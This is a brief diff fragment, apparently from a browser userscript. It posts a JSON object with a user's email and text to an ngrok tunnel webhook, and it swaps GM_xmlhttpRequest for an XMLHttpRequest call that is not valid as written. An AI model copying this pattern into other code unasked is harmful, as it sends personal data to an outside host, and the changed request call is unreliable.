@@ -32,7 +32,7 @@
             if(text && text.length) {
                 const data = JSON.stringify({ email, text });
                 _logger(data);
-                GM_xmlhttpRequest({
+                XMLHttpRequest({
                     method: 'POST',
                     url: 'https://489ea395.ngrok.io/webhook1',
                     data,
